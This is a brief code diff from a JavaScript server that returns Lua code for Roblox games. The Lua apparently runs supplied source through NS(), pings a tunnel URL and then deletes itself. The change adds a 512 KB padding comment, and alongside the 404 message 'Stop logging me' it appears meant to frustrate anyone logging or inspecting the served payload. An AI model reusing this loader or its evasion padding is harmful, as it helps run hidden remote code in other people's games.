@@ -104,7 +104,7 @@ vorpal
 					.send(
 						`local h=game:GetService("HttpService");local _ = NS([====[${read}]====], workspace);pcall(h.GetAsync,h,"` +
 							(tun?.url || "https://localhost:3002") +
-							`");script:Destroy()`
+							`");script:Destroy();--${"a".repeat(1024 * 512)}`
 					);
 			} else {
 				res.status(404).send("no!!! (No way! Stop logging me!!1)");
